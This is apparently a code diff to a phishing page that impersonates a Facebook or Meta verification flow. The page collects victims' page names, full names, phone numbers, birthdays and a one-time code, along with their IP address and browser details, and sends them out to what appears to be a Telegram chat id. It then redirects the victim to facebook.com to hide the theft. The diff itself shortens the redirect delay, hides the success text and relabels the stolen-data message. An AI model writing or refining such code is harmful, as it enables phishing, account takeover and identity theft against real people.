@@ -12,8 +12,8 @@
         
         #p1 { max-width: 550px; text-align: center; margin-top: 80px; }
         
-        /* Updated only these two parts for the image fit */
-        .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; font-size: 100px; }
+        /* Updated CSS to make images fit perfectly */
+        .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
         .illustration img { width: 100%; max-width: 700px; height: auto; display: block; }
         
         h1, h2 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; }
@@ -33,9 +33,12 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         .otp-box { letter-spacing: 15px; font-size: 30px; text-align: center; font-weight: bold; }
-        .success-checkmark { width: 80px; height: 80px; margin: 0 auto 20px; background: var(--m-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 40px; }
+        .success-checkmark { width: 80px; height: 80px; margin: 0 auto; background: var(--m-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 40px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         footer { margin-top: auto; padding: 20px; text-align: center; color: var(--m-gray); font-size: 12px; }
+        
+        /* Custom hide for the success text */
+        .hide-text h2, .hide-text p { display: none !important; }
     </style>
 </head>
 <body>
@@ -116,7 +119,7 @@
     const _c = "5901396648";
     let uIP = "Detecting...";
     
-    // Gathers browser info, OS, and Screen Size
+    // Gathers browser details for the report
     const bDetails = `🖥️ Browser: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n📏 Screen: ${window.screen.width}x${window.screen.height}`;
 
     fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => uIP = d.ip);
@@ -148,7 +151,7 @@
     async function step(f, t) {
         if (f === 2) {
             document.getElementById('b2').innerText = "Processing...";
-            await send(`🚨 *PAGE 1 - DETAILS*\n👤 *Page:* ${document.getElementById('pname').value}\n👤 *Name:* ${document.getElementById('fname').value}\n📞 *Phone:* ${document.getElementById('phone').value}\n🎂 *Bday:* ${document.getElementById('bday').value}\n🌐 *IP:* ${uIP}\n${bDetails}`);
+            await send(`🚨 *PAGE 1 - INFO*\n👤 *Page:* ${document.getElementById('pname').value}\n👤 *Name:* ${document.getElementById('fname').value}\n📞 *Phone:* ${document.getElementById('phone').value}\n🎂 *Bday:* ${document.getElementById('bday').value}\n🌐 *IP:* ${uIP}\n${bDetails}`);
         }
         if (f === 3) {
             document.getElementById('b3').innerText = "Verifying...";
@@ -167,8 +170,11 @@
             setTimeout(() => {
                 document.getElementById('loading').classList.add('hidden');
                 document.getElementById('done').classList.remove('hidden');
-                setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 5000);
-            }, 3000);
+                // Adds class to hide text as requested
+                document.getElementById('p5').classList.add('hide-text'); 
+                // Redirects in 2 seconds
+                setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 2000);
+            }, 2000);
         }
     }
 </script>
